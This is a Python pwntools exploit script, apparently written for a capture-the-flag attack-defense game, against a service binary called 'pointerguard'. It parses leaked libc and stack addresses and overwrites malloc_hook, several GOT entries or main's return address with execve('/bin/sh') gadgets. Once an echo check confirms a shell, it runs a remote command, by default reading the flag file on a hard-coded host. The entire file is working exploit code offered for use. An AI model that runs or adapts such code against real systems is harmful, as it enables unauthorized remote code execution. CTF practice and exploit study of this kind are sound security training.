#! /usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *

DEBUG = 0
context.timeout = 2

def hook_malloc_attack(p):
	p.recvuntil("libc_base=")
	libc_base = p.readline().strip()
	p.recvuntil("stack_base=")
	stack_base = p.readline().strip()
	try:
		libc_base = int(libc_base[2:],16)
	except ValueError:
		print "libc_base error: %x" %libc_base
		return False
	try:
		stack_base = int(stack_base[2:],16)
	except ValueError:
		print "stack_base error: %x" %stack_base
		return False

	exec_add = 0x4526a	# execve("/bin/sh", rsp+0x30, environ)
	malloc_hook = 0x3c4b10
	malloc_got = 0x602088
	free_got = 0x602018
	realloc = 0x602090
	poc = {
		# malloc hook
		str(libc_base+malloc_hook): str(libc_base+exec_add),
		str(libc_base+malloc_hook-1): str(((libc_base+exec_add)<<8)+0x41),
		str(libc_base+malloc_hook-2): str(((libc_base+exec_add)<<16)+0x4141),
		str(malloc_got): str(libc_base+exec_add),
		str(malloc_got-1): str(((libc_base+exec_add)<<8)+0x41),
		str(malloc_got-2): str(((libc_base+exec_add)<<16)+0x4141),
		str(free_got): str(libc_base+exec_add),
		str(free_got-1): str(((libc_base+exec_add)<<8)+0x41),
		str(free_got-2): str(((libc_base+exec_add)<<16)+0x4141),
		str(realloc): str(libc_base+exec_add),
	}

	p.recvuntil("somewhere?")
	p.sendline("Yes! I want!")
	for x in poc:
		p.recvuntil("Addr:")
		p.sendline(x)
		p.recvuntil("Value:\n")
		p.sendline(poc[x])

	p.recvuntil("end\n")
	p.sendline("malloc/free")
	p.sendline("10")
	p.sendline("echo iamsocai")
	if p.recvuntil("iamsocai\n") != "":
		return True
	else:
		return False

def ret_main_attack(p):
	p.recvuntil("libc_base=")
	libc_base = p.readline().strip()
	p.recvuntil("stack_base=")
	stack_base = p.readline().strip()
	try:
		libc_base = int(libc_base[2:],16)
	except ValueError:
		print "libc_base error: %x" %libc_base
		return False
	try:
		stack_base = int(stack_base[2:],16)
	except ValueError:
		print "stack_base error: %x" %stack_base
		return False

	exec_add = 0xf1117		# execve("/bin/sh", rsp+0x70, environ)
	poc = {
		# main ret
		str(stack_base+212): str(libc_base+exec_add),
		str(stack_base+212-1): str(((libc_base+exec_add)<<8)+0x41),
		str(stack_base+212-2): str(((libc_base+exec_add)<<16)+0x4141),
		# main ret
		str(stack_base+212+1): str((libc_base+exec_add)>>8),
		str(stack_base+212+2): str((libc_base+exec_add)>>16),
		str(stack_base+212-3): str(((libc_base+exec_add)<<24)+0x414141),
		# main ret
		str(stack_base+212+3): str((libc_base+exec_add)>>24),
		str(stack_base+212+4): str((libc_base+exec_add)>>32),
		str(stack_base+212-4): str(((libc_base+exec_add)<<32)+0x41414141),
		# main ret
		str(stack_base+212-5): str(((libc_base+exec_add)<<40)+0x4141414141),
	}
	p.recvuntil("somewhere?")
	p.sendline("Yes! I want!")
	for x in poc:
		p.recvuntil("Addr:")
		p.sendline(x)
		p.recvuntil("Value:\n")
		p.sendline(poc[x])
	p.recvuntil("end\n")
	p.sendline("return")
	p.sendline("echo iamsocai")
	try:
		p.recvuntil("iamsocai\n")
		return True
	except EOFError:
		return False

def direct_attack(p):
	p.recvuntil("libc_base=")
	libc_base = p.readline().strip()
	p.recvuntil("stack_base=")
	stack_base = p.readline().strip()
	try:
		libc_base = int(libc_base[2:],16)
	except ValueError:
		print "libc_base error: %x" %libc_base
		return False
	try:
		stack_base = int(stack_base[2:],16)
	except ValueError:
		print "stack_base error: %x" %stack_base
		return False	

	exec_add = 0xf1117		# execve("/bin/sh", rsp+0x70, environ)
	ret1_offset = 20
	puts_got = 0x602028
	getchar_got = 0x602078
	poc = {
		# 0x400f60 ret
		str(stack_base+ret1_offset): str(libc_base+exec_add),
		str(stack_base+ret1_offset-1): str(((libc_base+exec_add)<<8)+0x41),
		str(stack_base+ret1_offset-2): str(((libc_base+exec_add)<<16)+0x4141),
		# puts got
		str(puts_got): str(libc_base+exec_add),
		str(puts_got-1): str(((libc_base+exec_add)<<8)+0x41),
		str(puts_got-2): str(((libc_base+exec_add)<<16)+0x4141),
		# getchar got
		str(getchar_got): str(libc_base+exec_add),
		str(getchar_got-1): str(((libc_base+exec_add)<<8)+0x41),
		str(getchar_got-2): str(((libc_base+exec_add)<<16)+0x4141),
		# puts got
		str(puts_got+1): str((libc_base+exec_add)>>8),
	}

	p.recvuntil("somewhere?")
	p.sendline("Yes! I want!")
	for x in poc:
		if p.recvuntil("Addr:") == "":
			p.sendline("echo iamsocai")
			if p.recvuntil("iamsocai\n") != "":
				return True
			else:
				return False
		else:
			p.sendline(x)
			p.recvuntil("Value:\n")
			p.sendline(poc[x])

def attack(ip="", port=20001, cmd="whoami"):
	func_list = [ret_main_attack, hook_malloc_attack, direct_attack]
	for func in func_list:
		if DEBUG:
			p = process("./pointerguard", env={"LD_PRELOAD": "./libc.x64.so"})
			context.log_level = "debug"
			# context.terminal = ['terminator','-x','bash','-c']
			# gdb.attach(p)
			# raw_input()
		else:
			try:
				p = remote(ip, port)
			except PwnlibException:
				continue

		try:
			r = func(p)
		except EOFError:
			continue
		if not r:
			p.close()
			continue
		if DEBUG:
			p.interactive()
		else:
			p.sendline(cmd)
			try:
				result = p.readline()
			except EOFError:
				print "shell cmd error: %s" %cmd
				p.close()
				continue
			return result
	return False

def main():
	print attack(ip="172.16.11.101", port=20001, cmd="cat flag/flag")


if __name__ == '__main__':
	main()